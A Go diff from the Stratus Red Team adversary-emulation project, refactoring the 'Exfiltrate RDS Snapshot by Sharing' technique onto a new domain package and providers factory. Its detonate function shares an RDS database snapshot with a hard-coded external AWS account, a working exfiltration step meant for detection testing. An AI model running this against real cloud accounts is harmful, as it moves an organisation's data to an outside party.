@@ -6,8 +6,8 @@ import (
 	"errors"
 	"github.com/aws/aws-sdk-go-v2/aws"
 	"github.com/aws/aws-sdk-go-v2/service/rds"
-	"github.com/datadog/stratus-red-team/v2/internal/providers"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
+	"github.com/datadog/stratus-red-team/v2/pkg/stratus/domain"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
 	"log"
 )
@@ -16,10 +16,10 @@ import (
 var tf []byte
 
 func init() {
-	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
+	stratus.GetRegistry().RegisterAttackTechnique(&domain.AttackTechnique{
 		ID:                 "aws.exfiltration.rds-share-snapshot",
 		FriendlyName:       "Exfiltrate RDS Snapshot by Sharing",
-		Platform:           stratus.AWS,
+		Platform:           domain.AWS,
 		IsSlow:             true,
 		IsIdempotent:       true,
 		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
@@ -57,9 +57,9 @@ An attacker can also make an RDS snapshot completely public. In this case, the v
 
 var AccountIdToShareWith = []string{"193672423079"}
 
-func detonate(params map[string]string) error {
+func detonate(providers domain.ProvidersFactory, params map[string]string) error {
 	snapshotId := params["snapshot_id"]
-	rdsClient := rds.NewFromConfig(providers.AWS().GetConnection())
+	rdsClient := rds.NewFromConfig(providers.GetAWSProvider().GetConnection())
 
 	log.Println("Sharing RDS Snapshot " + snapshotId + " with an external AWS account")
 	_, err := rdsClient.ModifyDBSnapshotAttribute(context.Background(), &rds.ModifyDBSnapshotAttributeInput{
@@ -75,9 +75,9 @@ func detonate(params map[string]string) error {
 	return nil
 }
 
-func revert(params map[string]string) error {
+func revert(providers domain.ProvidersFactory, params map[string]string) error {
 	snapshotId := params["snapshot_id"]
-	rdsClient := rds.NewFromConfig(providers.AWS().GetConnection())
+	rdsClient := rds.NewFromConfig(providers.GetAWSProvider().GetConnection())
 
 	log.Println("Un-sharing RDS Snapshot " + snapshotId + " with an external AWS account")
 	_, err := rdsClient.ModifyDBSnapshotAttribute(context.Background(), &rds.ModifyDBSnapshotAttributeInput{
